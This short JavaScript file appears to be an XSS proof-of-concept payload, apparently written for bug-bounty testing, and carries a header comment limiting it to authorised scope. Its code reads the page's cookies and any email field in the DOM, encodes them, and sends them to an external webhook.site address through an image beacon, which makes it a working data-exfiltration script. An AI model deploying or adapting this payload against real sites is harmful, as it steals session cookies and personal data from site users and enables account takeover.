// impact_test.js — run only on test account / authorized scope
console.log("inAuth impact PoC loaded from GH Pages");

// Try to read non-HttpOnly cookies (may be empty if HttpOnly or cookie not set)
var stolen = document.cookie || "NO_COOKIE_AVAILABLE";

// Also try to extract some page DOM text as alternate proof
var possibleEmail = (document.querySelector('input[type="email"]') || {}).value || 
                    (document.querySelector('[data-user-email]') || {}).textContent || "";

// Build payload (encode)
var payload = "cookie=" + encodeURIComponent(stolen) + "&dom=" + encodeURIComponent(possibleEmail);

// Fire beacon to webhook (your webhook id here)
new Image().src = "https://webhook.site/0535ca62-3583-48a2-896d-d18863722cfb?"+payload+"&ts="+Date.now();

// Optional: console confirm for local verification
console.log("PoC payload sent:", payload);
